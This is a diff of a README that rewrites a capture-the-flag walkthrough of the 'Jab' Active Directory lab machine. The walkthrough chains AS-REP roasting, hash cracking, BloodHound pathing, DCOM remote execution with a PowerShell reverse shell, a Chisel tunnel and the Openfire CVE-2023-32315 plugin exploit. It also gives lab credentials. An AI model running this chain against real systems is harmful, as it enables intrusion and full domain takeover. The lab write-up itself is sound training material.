@@ -1,104 +1,93 @@
 # Jab - Active Directory Exploitation Walkthrough
 
-This repository documents the full exploitation process of the **Jab** Active Directory lab machine from initial enumeration to full domain compromise. The lab simulates a Windows enterprise environment with Kerberos authentication, XMPP communication, and internal services like Openfire. The goal was to gain Domain Admin access through realistic attack paths.
+This walkthrough demonstrates the full exploitation of the **Jab** Active Directory lab environment. The assessment includes user enumeration, AS-REP roasting, SMB enumeration, BloodHound-based lateral movement, and remote code execution through Openfire (CVE-2023-32315) to achieve Domain Admin access.
 
 ---
 
-## 🧭 Lab Overview
+## 🧠 Lab Information
 
-- **Target IP:** 10.10.11.4
+- **IP Address:** 10.10.11.4
 - **Domain:** jab.htb
-- **DC Hostname:** dc01.jab.htb
-- **Environment:** Active Directory + XMPP/Openfire
+- **Domain Controller:** dc01.jab.htb
+- **Services:** Kerberos, SMB, LDAP, XMPP/Openfire
 
 ---
 
-## 🔍 Reconnaissance
+## 🔍 Enumeration
 
 ### Nmap Scan
 
 ```bash
 nmap -sC -sV -oA nmap 10.10.11.4
-Open Ports:
 
-Kerberos (88), LDAP (389/636), SMB (445), RPC (135/593)
+Key Ports:
+88, 389, 636, 445 – Kerberos, LDAP, SMB
+5222, 5269, 7070, 7443, 7777 – XMPP (Openfire)
 
-XMPP/Openfire (5222, 5269, 7070, 7443, 7777)
-
-Domain: jab.htb
-
-Host Enumeration
-Added entries to /etc/hosts:
-
-Copy
-Edit
-10.10.11.4 dc01.jab.htb jab.htb
-👤 User Enumeration & XMPP Discovery
+Add to /etc/hosts:
+10.10.11.4 jab.htb dc01.jab.htb
+🔐 Kerberos & XMPP Enumeration
 Kerberos User Enumeration
 bash
 Copy
 Edit
-kerbrute userenum --dc dc01.jab.htb -d jab.htb \
-  /usr/share/spray/name-lists/statistically-likely-usernames/jsmith.txt -o kerbrute
-Thousands of users were identified. Many were filtered for Kerberos pre-auth checks.
+kerbrute userenum --dc dc01.jab.htb -d jab.htb usernames.txt -o kerbrute.txt
 
-XMPP Enumeration via Pidgin
-Installed Pidgin (XMPP client):
+Thousands of users discovered.
 
-bash
-Copy
-Edit
-sudo apt install pidgin
-Created a test account
-
-Discovered chat rooms and usernames (e.g., bdavis)
-
-Later logged in as jmontgomery using credentials retrieved via AS-REP roasting
-
-🔐 AS-REP Roasting & Password Cracking
-Harvesting AS-REP Hashes
+AS-REP Roasting
 bash
 Copy
 Edit
 impacket-GetNPUsers jab.htb/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
-Cracking Hashes with Hashcat
+Crack Hash with Hashcat
 bash
 Copy
 Edit
-hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-Credentials Recovered:
+hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
+Cracked Credential:
 
 jmontgomery : Midnight_121
 
-Used in Pidgin to access additional rooms and recovered another credential:
+💬 XMPP Enumeration (Pidgin)
+Install and open Pidgin.
 
-svc_openfire : !@#$%^&*(1qazxsw
+Create new XMPP account using cracked credentials.
 
-📁 SMB & BloodHound Enumeration
-SMB Access
+Join chat rooms to discover additional usernames and messages.
+
+Found credentials:
+
+svc_openfire : !@#$%^&*(1qazxsw)
+
+📁 SMB Enumeration
 bash
 Copy
 Edit
-smbmap -u 'svc_openfire' -p '!@#$%^&*(1qazxsw' -H 10.10.11.4
-No sensitive files found.
+smbmap -u svc_openfire -p '!@#$%^&*(1qazxsw)' -H 10.10.11.4
+Limited access, no sensitive data found.
 
-BloodHound Enumeration
+🧠 BloodHound Analysis
+Data Collection
 bash
 Copy
 Edit
-bloodhound-python -u svc_openfire -p '!@#$%^&*(1qazxsw' -d jab.htb -dc dc01.jab.htb -c all -ns 10.10.11.4
-zip -r bloodhound.zip bloodhound
-Analyzed in BloodHound via Neo4j. Found an attack path to the Domain Controller using DCOM execution.
+bloodhound-python -u svc_openfire -p '!@#$%^&*(1qazxsw)' -d jab.htb -dc dc01.jab.htb -c all -ns 10.10.11.4
+zip -r bloodhound.zip bloodhound/
+BloodHound GUI (Neo4j)
+Upload collected data.
 
-🧨 DCOM Exploitation (Remote Code Execution)
-RCE via DCOMExec (Impacket)
-Generated PowerShell payload from revshells.com and used:
+Identify attack path using DCOM and Remote Code Execution privileges.
+
+🧨 Remote Code Execution via DCOM
+Reverse Shell Payload
+Generate a PowerShell reverse shell from revshells.com, then:
 
 bash
 Copy
 Edit
-impacket-dcomexec 'jab.htb/svc_openfire:!@#$%^&*(1qazxsw@dc01.jab.htb' '<encoded-powershell>'
-Connected to reverse shell:
+impacket-dcomexec 'jab.htb/svc_openfire:!@#$%^&*(1qazxsw)@dc01.jab.htb' '<PowerShellCommand>'
+Start listener:
 
 bash
 Copy
@@ -106,36 +95,36 @@ Edit
 rlwrap nc -nlvp 6658
 ✅ User Flag: 58b27f9faaec3dfdb2a94dad6a1e2175
 
-🔄 Port Forwarding to Internal Web Interface
-Discovered internal ports: 9090, 9091 (Openfire admin panel)
+🔁 Pivoting with Chisel
+Setup Chisel Tunnel
+Server (Attacker):
 
-Pivot with Chisel
 bash
 Copy
 Edit
 chisel server -p 9999 --reverse
-chisel client 10.10.14.123:9999 R:9090:127.0.0.1:9090
-Accessed Openfire admin at: http://127.0.0.1:9090
-
-Logged in as svc_openfire
-
-⚙️ CVE-2023-32315 - Openfire RCE Exploitation
-Cloned and used public exploit:
+Client (Victim):
 
 bash
 Copy
 Edit
-git clone https://github.com/miko550/CVE-2023-32315.git
-pip3 install -r requirements.txt
-Uploaded malicious plugin through the Openfire admin panel to gain RCE.
+chisel client <YourIP>:9999 R:9090:127.0.0.1:9090
+Access Openfire admin: http://127.0.0.1:9090
 
-PowerShell Payload Execution
-powershell
+⚙️ Exploiting Openfire (CVE-2023-32315)
+Exploit Setup
+bash
 Copy
 Edit
-powershell -nop -W hidden -noni -ep bypass -c "$client = New-Object..."
-Caught shell:
+git clone https://github.com/miko550/CVE-2023-32315.git
+cd CVE-2023-32315
+pip3 install -r requirements.txt
+Upload Malicious Plugin
+Login to Openfire admin panel.
 
+Use exploit to upload a reverse shell plugin.
+
+Catch Shell
 bash
 Copy
 Edit
@@ -143,18 +132,12 @@ rlwrap nc -nlvp 4444
 ✅ Root Flag: 8f826f76eb871e0566058e6580760e8e
 
 ✅ Summary
-Enumerated users via Kerberos and XMPP (Pidgin)
-
-Performed AS-REP roasting and cracked passwords
-
-Moved laterally through BloodHound-mapped DCOM path
-
-Used Impacket to gain shell on DC
-
-Pivoted with Chisel to internal admin panel
-
-Gained RCE via Openfire plugin vulnerability (CVE-2023-32315)
-
-
+| Step                 | Technique                     | Result                          |
+| -------------------- | ----------------------------- | ------------------------------- |
+| User Enumeration     | Kerbrute, AS-REP roasting     | Found jmontgomery credentials   |
+| XMPP Enumeration     | Pidgin                        | Found svc\_openfire credentials |
+| Lateral Movement     | BloodHound (DCOM)             | Executed shell on DC            |
+| Privilege Escalation | Openfire RCE (CVE-2023-32315) | Gained SYSTEM shell             |
+| Flags Captured       | User & Root                   | ✅ Complete compromise           |
 
 Author: Farhanahmad Quraishi
